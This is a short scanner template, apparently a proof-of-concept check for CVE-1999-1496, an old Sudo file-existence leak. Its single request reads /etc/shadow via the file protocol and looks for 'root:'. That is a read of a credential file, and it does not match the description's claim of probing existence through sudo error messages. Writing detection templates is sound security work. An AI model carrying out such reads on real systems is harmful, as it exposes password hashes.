[info]
author = "AVE"
description = "检测 Sudo 1.5 文件存在性信息泄露漏洞。通过 file 协议检查敏感文件是否存在，模拟本地攻击者利用 sudo 执行不同文件时返回不同错误提示来探测文件存在性的行为。"
id = "POC-AVE-1999-1134"
name = "CVE-1999-1496 PoC"
severity = "low"
tags = ["ave-1999-1134"]
vuln_id = [
    "CVE-1999-1496",
    "AVE-1999-1134",
]

[poc]
logic = "any"

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
